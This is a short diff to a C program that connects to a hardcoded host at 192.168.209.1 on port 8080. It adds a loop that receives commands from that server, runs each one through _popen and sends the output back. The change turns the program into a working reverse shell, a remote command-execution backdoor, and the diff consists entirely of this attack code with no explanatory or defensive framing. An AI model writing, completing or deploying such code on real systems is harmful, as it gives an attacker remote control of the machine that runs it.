@@ -21,6 +21,8 @@ int main() {
 
   // Server address to connect to
   struct sockaddr_in server_addr;
+  memset(&server_addr, 0, sizeof(server_addr));
+
   server_addr.sin_family = AF_INET;
   server_addr.sin_port = htons(8080);
   inet_pton(AF_INET, "192.168.209.1", &server_addr.sin_addr);
@@ -35,6 +37,23 @@ int main() {
   }
 
   while (1) {
+    char cmd[1024];
 
+    int n = recv(sock, cmd, sizeof(cmd) - 1, 0);
+
+    if (n > 0) {
+      cmd[n] = '\0';
+      printf("Received from server: %s", cmd);
+    }
+
+    FILE *fp = _popen(cmd, "r");
+
+    char output[4096];
+    size_t len = fread(output, 1, sizeof(output)-1, fp);
+
+    output[len] = '\0';
+    _pclose(fp);
+
+    send(sock, output, strlen(output), 0);
   }
 }
